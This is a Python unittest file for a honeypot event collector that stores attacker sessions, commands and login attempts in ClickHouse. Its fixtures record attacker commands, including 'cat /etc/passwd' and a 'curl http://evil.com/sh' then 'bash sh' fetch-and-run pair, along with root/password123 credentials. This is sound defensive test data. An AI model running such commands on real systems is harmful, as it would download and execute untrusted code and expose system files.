"""
Unit tests for Event Collector priority ingestion and bounded orphan message recovery.
Validates that:
1. Fresh events (">") are prioritized and written to ClickHouse first.
2. XAUTOCLAIM is strictly bounded per cycle (never loops infinitely).
3. Pagination cursors are persisted across cycles.
4. Malformed reclaimed events are NEVER ACKed.
5. Failed ClickHouse writes do not ACK messages.
6. ACK retry with exponential backoff works properly.
"""
import sys
import os
import json
import unittest
from unittest.mock import AsyncMock, MagicMock, patch

# Ensure mocks for third-party modules not installed locally
for mod in ["clickhouse_connect", "httpx", "redis", "redis.asyncio", "fastapi.responses"]:
    sys.modules.setdefault(mod, MagicMock())

fastapi_mock = sys.modules.setdefault("fastapi", MagicMock())
fastapi_mock.FastAPI.return_value.get.side_effect = lambda *a, **kw: lambda f: f
fastapi_mock.FastAPI.return_value.post.side_effect = lambda *a, **kw: lambda f: f

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from backend.collector.main import (
    EventCollector,
    SessionUpdateRequest,
    collector,
    health,
    update_session,
)
from backend.schemas.events import ConsumerGroups, StreamNames


class TestCollectorRecovery(unittest.IsolatedAsyncioTestCase):

    def setUp(self):
        self.collector = EventCollector()
        self.collector.redis = AsyncMock()
        self.collector.clickhouse_client = MagicMock()

    async def test_reclaim_orphaned_messages_strictly_bounded(self):
        """Verify XAUTOCLAIM is bounded by max_total_reclaimed and persists cursors."""
        streams_to_consume = [
            (StreamNames.SESSION_EVENTS, "sessions"),
            (StreamNames.AUTH_EVENTS, "auth"),
        ]

        sample_event = {
            "event_type": "session_start",
            "payload": {
                "session_id": "sess-recover-1",
                "timestamp": "2026-09-05T12:00:00Z",
                "attacker_ip": "1.2.3.4",
            },
        }

        # Mock xautoclaim returning 50 messages on first stream, with cursor '100-0'
        msgs_stream1 = [(f"1-{i}", {"data": json.dumps(sample_event)}) for i in range(50)]
        msgs_stream2 = [(f"2-{i}", {"data": json.dumps(sample_event)}) for i in range(50)]

        self.collector.redis.xautoclaim.side_effect = [
            ("100-0", msgs_stream1, []),
            ("200-0", msgs_stream2, []),
        ]

        with patch.object(self.collector, "_write_events_to_clickhouse", new_callable=AsyncMock) as mock_write, \
             patch.object(self.collector, "_ack_messages_with_retry", new_callable=AsyncMock) as mock_ack:

            await self.collector._reclaim_orphaned_messages(
                streams_to_consume, "test-consumer", max_total_reclaimed=100
            )

            # Reclaimed 50 from stream 1, 50 from stream 2 -> exactly 100 total
            self.assertEqual(self.collector.redis.xautoclaim.call_count, 2)
            self.assertEqual(mock_write.call_count, 2)
            self.assertEqual(mock_ack.call_count, 2)

            # Verify cursors were persisted
            self.assertEqual(self.collector._autoclaim_cursors[StreamNames.SESSION_EVENTS], "100-0")
            self.assertEqual(self.collector._autoclaim_cursors[StreamNames.AUTH_EVENTS], "200-0")

    async def test_reclaim_cursor_wraps_around_to_zero(self):
        """Verify cursor resets to '0-0' when next_start_id is '0-0'."""
        streams = [(StreamNames.SESSION_EVENTS, "sessions")]
        self.collector._autoclaim_cursors[StreamNames.SESSION_EVENTS] = "999-0"

        self.collector.redis.xautoclaim.return_value = ("0-0", [], [])

        await self.collector._reclaim_orphaned_messages(streams, "test-consumer", max_total_reclaimed=100)
        self.assertEqual(self.collector._autoclaim_cursors[StreamNames.SESSION_EVENTS], "0-0")

    async def test_malformed_reclaimed_events_never_acked(self):
        """Malformed events in reclaimed messages must NOT be ACKed."""
        streams = [(StreamNames.SESSION_EVENTS, "sessions")]

        valid_event = {
            "event_type": "session_start",
            "payload": {"session_id": "sess-ok", "timestamp": "2026-09-05T12:00:00Z"},
        }
        claimed_messages = [
            ("msg-valid-1", {"data": json.dumps(valid_event)}),
            ("msg-malformed-2", {"data": "{not-valid-json"}),
            ("msg-missing-data-3", {}),
            ("msg-valid-4", {"data": json.dumps(valid_event)}),
        ]

        self.collector.redis.xautoclaim.return_value = ("100-0", claimed_messages, [])

        with patch.object(self.collector, "_write_events_to_clickhouse", new_callable=AsyncMock) as mock_write, \
             patch.object(self.collector, "_ack_messages_with_retry", new_callable=AsyncMock) as mock_ack:

            await self.collector._reclaim_orphaned_messages(streams, "test-consumer", max_total_reclaimed=100)

            mock_write.assert_called_once()
            written_events = mock_write.call_args[0][0]
            self.assertEqual(len(written_events), 2)
            self.assertEqual([e["id"] for e in written_events], ["msg-valid-1", "msg-valid-4"])

            # ONLY valid message IDs must be ACKed
            mock_ack.assert_called_once_with(StreamNames.SESSION_EVENTS, ["msg-valid-1", "msg-valid-4"])

    async def test_failed_clickhouse_write_does_not_ack(self):
        """If writing to ClickHouse fails, messages must NOT be ACKed."""
        streams = [(StreamNames.SESSION_EVENTS, "sessions")]
        valid_event = {
            "event_type": "session_start",
            "payload": {"session_id": "sess-fail", "timestamp": "2026-09-05T12:00:00Z"},
        }
        self.collector.redis.xautoclaim.return_value = (
            "100-0",
            [("msg-1", {"data": json.dumps(valid_event)})],
            [],
        )

        with patch.object(self.collector, "_write_events_to_clickhouse", new_callable=AsyncMock, side_effect=RuntimeError("ClickHouse down")), \
             patch.object(self.collector, "_ack_messages_with_retry", new_callable=AsyncMock) as mock_ack:

            await self.collector._reclaim_orphaned_messages(streams, "test-consumer", max_total_reclaimed=100)
            mock_ack.assert_not_called()

    async def test_ack_messages_with_retry_success_first_try(self):
        """ACK succeeds immediately on first attempt."""
        self.collector.redis.xack.return_value = 2
        success = await self.collector._ack_messages_with_retry(
            StreamNames.SESSION_EVENTS, ["msg-1", "msg-2"]
        )
        self.assertTrue(success)
        self.collector.redis.xack.assert_called_once_with(
            ConsumerGroups.EVENT_COLLECTOR, StreamNames.SESSION_EVENTS, "msg-1", "msg-2"
        )

    async def test_ack_messages_with_retry_exponential_backoff(self):
        """ACK fails on initial call, succeeds on retry 2 with backoff."""
        self.collector.redis.xack.side_effect = [
            Exception("Connection reset"),
            Exception("Connection reset"),
            2,
        ]

        with patch("asyncio.sleep", new_callable=AsyncMock) as mock_sleep:
            success = await self.collector._ack_messages_with_retry(
                StreamNames.SESSION_EVENTS, ["msg-1", "msg-2"], max_retries=3, base_delay=0.1
            )
            self.assertTrue(success)
            self.assertEqual(self.collector.redis.xack.call_count, 3)
            mock_sleep.assert_any_call(0.1)
            mock_sleep.assert_any_call(0.2)

    async def test_ack_messages_with_retry_exhausted_retries(self):
        """ACK fails on all retries, returns False without unhandled crash."""
        self.collector.redis.xack.side_effect = Exception("Persistent error")

        with patch("asyncio.sleep", new_callable=AsyncMock):
            success = await self.collector._ack_messages_with_retry(
                StreamNames.SESSION_EVENTS, ["msg-1"], max_retries=2, base_delay=0.01
            )
            self.assertFalse(success)
            self.assertEqual(self.collector.redis.xack.call_count, 3)

    async def test_fresh_events_consumed_first_in_consumer_loop(self):
        """Verify _consumer_loop consumes fresh events ('>') and writes them immediately."""
        self.collector.running = True

        fresh_event = {
            "id": "fresh-msg-1",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {"event_type": "session_start", "payload": {"session_id": "sess-fresh-1"}},
        }

        # Mock consume_events to return fresh event on first stream, empty on others
        async def fake_consume(stream, group, consumer, count=50, block_ms=1000):
            # Stop the loop after consuming all streams in first iteration
            if stream == StreamNames.CLOUD_API_EVENTS:
                self.collector.running = False
            if stream == StreamNames.SESSION_EVENTS:
                return [fresh_event], ["fresh-msg-1"]
            return [], []

        self.collector.consume_events = AsyncMock(side_effect=fake_consume)
        self.collector._write_events_to_clickhouse = AsyncMock()
        self.collector._ack_messages_with_retry = AsyncMock()
        self.collector._reclaim_orphaned_messages = AsyncMock()

        with patch("asyncio.sleep", new_callable=AsyncMock):
            await self.collector._consumer_loop()

        # Fresh events written to ClickHouse and ACKed
        self.collector._write_events_to_clickhouse.assert_called_once_with([fresh_event])
        self.collector._ack_messages_with_retry.assert_called_once_with(
            StreamNames.SESSION_EVENTS, ["fresh-msg-1"]
        )

    async def test_write_events_to_clickhouse_runs_in_thread(self):
        """Verify _write_events_to_clickhouse delegates to asyncio.to_thread."""
        events = [{"id": "1", "data": {"event_type": "session_start"}}]

        with patch("asyncio.to_thread", new_callable=AsyncMock) as mock_to_thread:
            await self.collector._write_events_to_clickhouse(events)
            mock_to_thread.assert_called_once_with(
                self.collector._write_events_to_clickhouse_sync, events
            )

    async def test_health_responsive_during_background_write(self):
        """Verify /health endpoint responds immediately while background writes are active."""
        collector.redis = AsyncMock()
        collector.redis.ping.return_value = True

        collector.clickhouse_client = MagicMock()
        collector.clickhouse_client.command.return_value = 1

        import asyncio

        # Simulate background task executing ClickHouse inserts via to_thread
        async def background_write():
            await self.collector._write_events_to_clickhouse([{"id": "1", "data": {}}])

        # Run background write and health check concurrently
        write_task = asyncio.create_task(background_write())
        health_resp = await health()
        await write_task

        self.assertEqual(health_resp["status"], "healthy")
        self.assertEqual(health_resp["redis"], "healthy")
        self.assertEqual(health_resp["clickhouse"], "healthy")

    async def test_health_timeout_on_slow_clickhouse(self):
        """Verify /health does not block forever if ClickHouse hangs, returning degraded."""
        collector.redis = AsyncMock()
        collector.redis.ping.return_value = True

        collector.clickhouse_client = MagicMock()

        import time
        # Simulate ClickHouse hanging for longer than the 2s timeout
        def hanging_command(*args, **kwargs):
            time.sleep(3.0)
            return 1

        collector.clickhouse_client.command.side_effect = hanging_command

        health_resp = await health()
        self.assertEqual(health_resp["status"], "degraded")
        self.assertEqual(health_resp["redis"], "healthy")
        self.assertEqual(health_resp["clickhouse"], "unhealthy")

    async def test_clickhouse_client_access_serialized_no_concurrent_queries(self):
        """Verify concurrent operations on ClickHouse are strictly serialized without concurrent query errors."""
        import asyncio
        import time

        in_flight = 0
        max_concurrent = 0

        def simulated_command(*args, **kwargs):
            nonlocal in_flight, max_concurrent
            in_flight += 1
            if in_flight > max_concurrent:
                max_concurrent = in_flight
            if in_flight > 1:
                raise RuntimeError("Attempt to execute concurrent queries within the same session.")
            time.sleep(0.02)  # Simulate I/O latency
            in_flight -= 1
            return 1

        mock_client = MagicMock()
        mock_client.command.side_effect = simulated_command
        mock_client.insert.side_effect = simulated_command

        collector.clickhouse_client = mock_client
        collector.redis = AsyncMock()
        collector.redis.ping.return_value = True

        req = SessionUpdateRequest(
            session_id="sess-concurrency-test",
            intent="reconnaissance",
        )

        sample_event = {
            "id": "concur-1",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_start",
                "payload": {"session_id": "sess-concurrency-test", "timestamp": "2026-09-06T12:00:00Z"},
            },
        }

        # Launch multiple concurrent operations: update_session, health check, and write_events
        tasks = [
            asyncio.create_task(update_session(req)),
            asyncio.create_task(collector._write_events_to_clickhouse([sample_event])),
            asyncio.create_task(health()),
            asyncio.create_task(update_session(req)),
            asyncio.create_task(health()),
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in results:
            if isinstance(res, Exception):
                raise res

        # Strict proof: in_flight never exceeded 1 at any moment
        self.assertEqual(max_concurrent, 1)

    def test_session_end_calculates_duration_from_start_time_in_payload(self):
        """Verify session_end with duration_seconds=0 calculates ~6s from start_time and end_time."""
        self.collector.clickhouse_client = MagicMock()
        self.collector.clickhouse_client.command.return_value = 1

        event = {
            "id": "msg-end-1",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_end",
                "payload": {
                    "session_id": "45dfa3c32596",
                    "start_time": "2026-09-06 06:36:42",
                    "timestamp": "2026-09-06 06:36:48",
                    "duration_seconds": 0,
                    "disconnection_reason": "Connection closed by remote host",
                },
            },
        }

        self.collector._write_events_to_clickhouse_sync([event])

        # Verify command was called with duration_seconds = 6
        sql_calls = [call[0][0] for call in self.collector.clickhouse_client.command.call_args_list]
        update_calls = [s for s in sql_calls if "ALTER TABLE" in s and "sessions UPDATE" in s]
        self.assertEqual(len(update_calls), 1)
        self.assertIn("duration_seconds = 6", update_calls[0])
        self.assertIn("end_time = '2026-09-06 06:36:48'", update_calls[0])

    def test_session_end_calculates_duration_from_clickhouse_start_time(self):
        """Verify session_end without start_time queries ClickHouse and computes correct duration."""
        self.collector.clickhouse_client = MagicMock()

        def mock_command(sql):
            if "SELECT start_time FROM" in sql:
                return "2026-09-06 06:36:42"
            if "SELECT count() FROM" in sql and "sessions" in sql:
                return 1
            return 0

        self.collector.clickhouse_client.command.side_effect = mock_command

        event = {
            "id": "msg-end-2",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_end",
                "payload": {
                    "session_id": "45dfa3c32596",
                    "timestamp": "2026-09-06 06:36:48",
                    "duration_seconds": 0,
                },
            },
        }

        self.collector._write_events_to_clickhouse_sync([event])

        sql_calls = [call[0][0] for call in self.collector.clickhouse_client.command.call_args_list]
        update_calls = [s for s in sql_calls if "ALTER TABLE" in s and "sessions UPDATE" in s]
        self.assertEqual(len(update_calls), 1)
        self.assertIn("duration_seconds = 6", update_calls[0])

    async def test_update_session_protects_existing_duration_from_zero_or_none(self):
        """Verify /update-session does not overwrite valid duration with 0 or None."""
        collector.clickhouse_client = MagicMock()
        collector.clickhouse_client.command.return_value = 1
        collector.redis = AsyncMock()
        collector.redis.ping.return_value = True

        # When duration_seconds is 0, duration_seconds should NOT be in the UPDATE statement
        req_zero = SessionUpdateRequest(
            session_id="45dfa3c32596",
            intent="credential_access",
            duration_seconds=0,
        )
        res_zero = await update_session(req_zero)
        self.assertTrue(res_zero.success)

        sql_zero = collector.clickhouse_client.command.call_args_list[-2][0][0]
        self.assertNotIn("duration_seconds", sql_zero)
        self.assertIn("intent = 'credential_access'", sql_zero)

        # When duration_seconds > 0, it SHOULD be included
        req_valid = SessionUpdateRequest(
            session_id="45dfa3c32596",
            duration_seconds=15,
        )
        res_valid = await update_session(req_valid)
        self.assertTrue(res_valid.success)

        sql_valid = collector.clickhouse_client.command.call_args_list[-2][0][0]
        self.assertIn("duration_seconds = 15", sql_valid)

    def test_inverted_cross_stream_ordering_reconciles_final_metrics(self):
        """Ordering: session_start -> session_end -> commands -> auth.
        Verifies that final session produces duration_seconds > 0, commands_executed, credentials_tried.
        """
        store = MockClickHouseStore()
        self.collector.clickhouse_client = store

        sid = "c4e4b469dc67"
        start_event = {
            "id": "msg-start",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_start",
                "payload": {
                    "session_id": sid,
                    "timestamp": "2026-09-06 06:36:42",
                    "attacker_ip": "1.2.3.4",
                },
            },
        }
        end_event = {
            "id": "msg-end",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_end",
                "payload": {
                    "session_id": sid,
                    "timestamp": "2026-09-06 06:36:48",
                    "duration_seconds": 0,
                    "disconnection_reason": "Connection closed by remote host",
                },
            },
        }
        cmd_events = [
            {
                "id": f"msg-cmd-{i}",
                "stream": StreamNames.COMMAND_EVENTS,
                "data": {
                    "event_type": "command",
                    "payload": {
                        "session_id": sid,
                        "command": cmd_text,
                        "timestamp": "2026-09-06 06:36:45",
                    },
                },
            }
            for i, cmd_text in enumerate(["whoami", "pwd", "uname -a", "ls -la", "sleep 3", "cat /etc/passwd", "exit"])
        ]
        auth_event = {
            "id": "msg-auth",
            "stream": StreamNames.AUTH_EVENTS,
            "data": {
                "event_type": "auth",
                "payload": {
                    "session_id": sid,
                    "username": "root",
                    "password": "password123",
                    "timestamp": "2026-09-06 06:36:43",
                },
            },
        }

        # 1. session_start
        self.collector._write_events_to_clickhouse_sync([start_event])
        # 2. session_end (arrives before commands & auth)
        self.collector._write_events_to_clickhouse_sync([end_event])
        # 3. commands
        self.collector._write_events_to_clickhouse_sync(cmd_events)
        # 4. auth
        self.collector._write_events_to_clickhouse_sync([auth_event])

        final_sess = store.sessions.get(sid)
        self.assertIsNotNone(final_sess)
        self.assertEqual(final_sess["duration_seconds"], 6)
        self.assertEqual(final_sess["commands_executed"], 7)
        self.assertEqual(final_sess["credentials_tried"], 1)
        self.assertEqual(final_sess["end_time"], "2026-09-06 06:36:48")

    def test_normal_cross_stream_ordering_produces_identical_metrics(self):
        """Ordering: session_start -> commands -> auth -> session_end.
        Must produce the exact same final metrics as inverted ordering.
        """
        store = MockClickHouseStore()
        self.collector.clickhouse_client = store

        sid = "normal-order-session"
        start_event = {
            "id": "msg-start",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_start",
                "payload": {
                    "session_id": sid,
                    "timestamp": "2026-09-06 06:36:42",
                    "attacker_ip": "1.2.3.4",
                },
            },
        }
        cmd_events = [
            {
                "id": f"msg-cmd-{i}",
                "stream": StreamNames.COMMAND_EVENTS,
                "data": {
                    "event_type": "command",
                    "payload": {
                        "session_id": sid,
                        "command": cmd_text,
                        "timestamp": "2026-09-06 06:36:45",
                    },
                },
            }
            for i, cmd_text in enumerate(["whoami", "pwd", "uname -a", "ls -la", "sleep 3", "cat /etc/passwd", "exit"])
        ]
        auth_event = {
            "id": "msg-auth",
            "stream": StreamNames.AUTH_EVENTS,
            "data": {
                "event_type": "auth",
                "payload": {
                    "session_id": sid,
                    "username": "root",
                    "password": "password123",
                    "timestamp": "2026-09-06 06:36:43",
                },
            },
        }
        end_event = {
            "id": "msg-end",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_end",
                "payload": {
                    "session_id": sid,
                    "timestamp": "2026-09-06 06:36:48",
                    "duration_seconds": 0,
                    "disconnection_reason": "Connection closed by remote host",
                },
            },
        }

        # 1. session_start
        self.collector._write_events_to_clickhouse_sync([start_event])
        # 2. commands
        self.collector._write_events_to_clickhouse_sync(cmd_events)
        # 3. auth
        self.collector._write_events_to_clickhouse_sync([auth_event])
        # 4. session_end
        self.collector._write_events_to_clickhouse_sync([end_event])

        final_sess = store.sessions.get(sid)
        self.assertIsNotNone(final_sess)
        self.assertEqual(final_sess["duration_seconds"], 6)
        self.assertEqual(final_sess["commands_executed"], 7)
        self.assertEqual(final_sess["credentials_tried"], 1)
        self.assertEqual(final_sess["end_time"], "2026-09-06 06:36:48")

    def test_same_batch_cross_stream_ordering(self):
        """Single batch containing [session_start, session_end, commands, auth] (as observed on Oracle).
        Must produce the exact same final metrics.
        """
        store = MockClickHouseStore()
        self.collector.clickhouse_client = store

        sid = "batch-order-session"
        all_events = [
            {
                "id": "msg-start",
                "stream": StreamNames.SESSION_EVENTS,
                "data": {
                    "event_type": "session_start",
                    "payload": {
                        "session_id": sid,
                        "timestamp": "2026-09-06 06:36:42",
                        "attacker_ip": "1.2.3.4",
                    },
                },
            },
            {
                "id": "msg-end",
                "stream": StreamNames.SESSION_EVENTS,
                "data": {
                    "event_type": "session_end",
                    "payload": {
                        "session_id": sid,
                        "timestamp": "2026-09-06 06:36:48",
                        "duration_seconds": 0,
                        "disconnection_reason": "Connection closed by remote host",
                    },
                },
            },
        ]
        for i, cmd_text in enumerate(["whoami", "pwd", "uname -a", "ls -la", "sleep 3", "cat /etc/passwd", "exit"]):
            all_events.append({
                "id": f"msg-cmd-{i}",
                "stream": StreamNames.COMMAND_EVENTS,
                "data": {
                    "event_type": "command",
                    "payload": {
                        "session_id": sid,
                        "command": cmd_text,
                        "timestamp": "2026-09-06 06:36:45",
                    },
                },
            })
        all_events.append({
            "id": "msg-auth",
            "stream": StreamNames.AUTH_EVENTS,
            "data": {
                "event_type": "auth",
                "payload": {
                    "session_id": sid,
                    "username": "root",
                    "password": "password123",
                    "timestamp": "2026-09-06 06:36:43",
                },
            },
        })

        self.collector._write_events_to_clickhouse_sync(all_events)

        final_sess = store.sessions.get(sid)
        self.assertIsNotNone(final_sess)
        self.assertEqual(final_sess["duration_seconds"], 6)
        self.assertEqual(final_sess["commands_executed"], 7)
        self.assertEqual(final_sess["credentials_tried"], 1)
        self.assertEqual(final_sess["end_time"], "2026-09-06 06:36:48")

    def test_extreme_inverted_ordering_session_end_first(self):
        """Ordering: session_end -> commands -> auth -> session_start.
        Must produce the exact same final metrics.
        """
        store = MockClickHouseStore()
        self.collector.clickhouse_client = store

        sid = "extreme-order-session"
        start_event = {
            "id": "msg-start",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_start",
                "payload": {
                    "session_id": sid,
                    "timestamp": "2026-09-06 06:36:42",
                    "attacker_ip": "1.2.3.4",
                },
            },
        }
        end_event = {
            "id": "msg-end",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_end",
                "payload": {
                    "session_id": sid,
                    "timestamp": "2026-09-06 06:36:48",
                    "duration_seconds": 0,
                    "disconnection_reason": "Connection closed by remote host",
                },
            },
        }
        cmd_events = [
            {
                "id": f"msg-cmd-{i}",
                "stream": StreamNames.COMMAND_EVENTS,
                "data": {
                    "event_type": "command",
                    "payload": {
                        "session_id": sid,
                        "command": cmd_text,
                        "timestamp": "2026-09-06 06:36:45",
                    },
                },
            }
            for i, cmd_text in enumerate(["whoami", "pwd", "uname -a", "ls -la", "sleep 3", "cat /etc/passwd", "exit"])
        ]
        auth_event = {
            "id": "msg-auth",
            "stream": StreamNames.AUTH_EVENTS,
            "data": {
                "event_type": "auth",
                "payload": {
                    "session_id": sid,
                    "username": "root",
                    "password": "password123",
                    "timestamp": "2026-09-06 06:36:43",
                },
            },
        }

        # 1. session_end first (session_start has not arrived!)
        self.collector._write_events_to_clickhouse_sync([end_event])
        # 2. commands
        self.collector._write_events_to_clickhouse_sync(cmd_events)
        # 3. auth
        self.collector._write_events_to_clickhouse_sync([auth_event])
        # 4. session_start arrives last
        self.collector._write_events_to_clickhouse_sync([start_event])

        final_sess = store.sessions.get(sid)
        self.assertIsNotNone(final_sess)
        self.assertEqual(final_sess["duration_seconds"], 6)
        self.assertEqual(final_sess["commands_executed"], 7)
        self.assertEqual(final_sess["credentials_tried"], 1)
        self.assertEqual(final_sess["end_time"], "2026-09-06 06:36:48")

    def test_active_session_reconciles_commands_without_session_end(self):
        """Active session receives command events while still connected (no session_end).
        ClickHouse sessions.commands_executed must immediately update to reflect actual commands.
        """
        store = MockClickHouseStore()
        self.collector.clickhouse_client = store

        sid = "active-session-reconcile"
        start_event = {
            "id": "msg-start-active",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_start",
                "payload": {
                    "session_id": sid,
                    "timestamp": "2026-09-13 10:00:00",
                    "attacker_ip": "1.2.3.4",
                },
            },
        }
        cmd_events = [
            {
                "id": f"msg-cmd-{i}",
                "stream": StreamNames.COMMAND_EVENTS,
                "data": {
                    "event_type": "command",
                    "payload": {
                        "session_id": sid,
                        "command": cmd_text,
                        "timestamp": "2026-09-13 10:00:05",
                    },
                },
            }
            for i, cmd_text in enumerate(["whoami", "id", "uname -a", "pwd", "ls -la"])
        ]

        # 1. session_start (initially commands_executed = 0)
        self.collector._write_events_to_clickhouse_sync([start_event])
        sess_init = store.sessions.get(sid)
        self.assertIsNotNone(sess_init)
        self.assertEqual(sess_init["commands_executed"], 0)

        # 2. commands arrive while session is still active (no session_end)
        self.collector._write_events_to_clickhouse_sync(cmd_events)

        # Must be reconciled to 5, NOT 0!
        sess_after = store.sessions.get(sid)
        self.assertIsNotNone(sess_after)
        self.assertEqual(sess_after["commands_executed"], 5)

    def test_late_commands_after_session_end_persists_updated_command_count(self):
        """Commands arrive after session_end event has already been processed.
        ClickHouse sessions.commands_executed must be reconciled to the new count.
        """
        store = MockClickHouseStore()
        self.collector.clickhouse_client = store

        sid = "late-cmd-session"
        start_event = {
            "id": "msg-start-late",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_start",
                "payload": {
                    "session_id": sid,
                    "timestamp": "2026-09-13 10:00:00",
                    "attacker_ip": "1.2.3.4",
                },
            },
        }
        end_event = {
            "id": "msg-end-late",
            "stream": StreamNames.SESSION_EVENTS,
            "data": {
                "event_type": "session_end",
                "payload": {
                    "session_id": sid,
                    "timestamp": "2026-09-13 10:00:10",
                    "duration_seconds": 10,
                    "disconnection_reason": "Connection closed",
                },
            },
        }
        late_cmd_events = [
            {
                "id": f"msg-late-cmd-{i}",
                "stream": StreamNames.COMMAND_EVENTS,
                "data": {
                    "event_type": "command",
                    "payload": {
                        "session_id": sid,
                        "command": cmd_text,
                        "timestamp": "2026-09-13 10:00:08",
                    },
                },
            }
            for i, cmd_text in enumerate(["curl http://evil.com/sh", "bash sh", "exit"])
        ]

        # 1. session_start
        self.collector._write_events_to_clickhouse_sync([start_event])
        # 2. session_end (processed before commands arrive, commands_executed = 0)
        self.collector._write_events_to_clickhouse_sync([end_event])
        sess_ended = store.sessions.get(sid)
        self.assertEqual(sess_ended["commands_executed"], 0)

        # 3. late commands arrive
        self.collector._write_events_to_clickhouse_sync(late_cmd_events)

        # Must be updated to 3
        sess_final = store.sessions.get(sid)
        self.assertEqual(sess_final["commands_executed"], 3)
        self.assertEqual(sess_final["duration_seconds"], 10)

        # Immutable identity fields MUST NOT be rewritten or changed
        self.assertEqual(sess_final["session_id"], sid)
        self.assertEqual(sess_final["attacker_ip"], "1.2.3.4")
        for update_query in store.update_history:
            self.assertNotIn("attacker_ip", update_query)
            self.assertNotIn("start_time", update_query)
            self.assertNotIn("protocol", update_query)


class MockClickHouseStore:
    """Mock ClickHouse client with in-memory storage for table state & queries."""
    def __init__(self):
        self.sessions = {}  # session_id -> dict
        self.commands = []  # list of tuples
        self.auth_attempts = []  # list of tuples
        self.cloud_api_requests = []
        self.update_history = []

    def insert(self, table, rows, column_names=None):
        if "sessions" in table:
            for r in rows:
                sid = r[0]
                self.sessions[sid] = {
                    "session_id": r[0],
                    "start_time": r[1],
                    "end_time": r[2],
                    "duration_seconds": r[3],
                    "attacker_ip": r[4],
                    "country": r[5],
                    "asn": r[6],
                    "protocol": r[7],
                    "commands_executed": r[8],
                    "files_transferred": r[9],
                    "credentials_tried": r[10],
                    "intent": r[11],
                    "skill_level": r[12],
                    "disconnection_reason": r[13],
                }
        elif "commands" in table:
            self.commands.extend(rows)
        elif "auth_attempts" in table:
            self.auth_attempts.extend(rows)
        elif "cloud_api" in table:
            self.cloud_api_requests.extend(rows)

    def command(self, sql):
        sql_str = str(sql)
        if "SELECT start_time FROM" in sql_str:
            for sid, data in self.sessions.items():
                if sid in sql_str:
                    return data["start_time"]
            return None

        if "SELECT count() FROM" in sql_str and "sessions" in sql_str:
            for sid in self.sessions:
                if sid in sql_str:
                    return 1
            return 0

        if ("SELECT count() FROM" in sql_str or "SELECT uniqExact(event_id) FROM" in sql_str) and "commands" in sql_str:
            if "uniqExact" in sql_str:
                events = {c[0] for c in self.commands if c[1] in sql_str}
                return len(events)
            count = 0
            for c in self.commands:
                if c[1] in sql_str:
                    count += 1
            return count

        if ("SELECT count() FROM" in sql_str or "SELECT uniqExact(event_id) FROM" in sql_str) and "auth_attempts" in sql_str:
            if "uniqExact" in sql_str:
                events = {a[0] for a in self.auth_attempts if a[1] in sql_str}
                return len(events)
            count = 0
            for a in self.auth_attempts:
                if a[1] in sql_str:
                    count += 1
            return count

        if "ALTER TABLE" in sql_str and "sessions UPDATE" in sql_str:
            self.update_history.append(sql_str)
            for sid, data in self.sessions.items():
                if f"session_id = '{sid}'" in sql_str:
                    update_part = sql_str.split("UPDATE ")[1].split(" WHERE")[0]
                    for item in update_part.split(", "):
                        k, v = item.split(" = ")
                        v_clean = v.strip("'")
                        if k == "duration_seconds":
                            data["duration_seconds"] = int(v_clean)
                        elif k == "commands_executed":
                            data["commands_executed"] = int(v_clean)
                        elif k == "credentials_tried":
                            data["credentials_tried"] = int(v_clean)
                        elif k == "end_time":
                            data["end_time"] = v_clean
                        elif k == "disconnection_reason":
                            data["disconnection_reason"] = v_clean
                    return 1
            return 0

        return 0

    def query(self, sql):
        sql_str = str(sql)
        res = MagicMock()
        rows = []
        if "sessions" in sql_str:
            for sid, data in self.sessions.items():
                if sid in sql_str:
                    if "commands_executed" in sql_str:
                        if "intent" in sql_str:
                            rows.append((
                                data.get("intent", ""),
                                data.get("skill_level", 0),
                                data.get("commands_executed", 0),
                                data.get("credentials_tried", 0),
                                data.get("duration_seconds", 0),
                                data.get("disconnection_reason", ""),
                            ))
                        else:
                            rows.append((
                                data.get("commands_executed", 0),
                                data.get("credentials_tried", 0),
                                data.get("duration_seconds", 0),
                                data.get("end_time"),
                                data.get("disconnection_reason", ""),
                            ))
                    else:
                        end_val = data.get("end_time")
                        start_val = data.get("start_time")
                        reason_val = data.get("disconnection_reason", "")
                        if reason_val or str(end_val) != str(start_val) or (data.get("duration_seconds", 0) > 0):
                            rows.append((end_val, data.get("duration_seconds", 0), reason_val))
        res.result_rows = rows
        return res


if __name__ == "__main__":
    unittest.main()
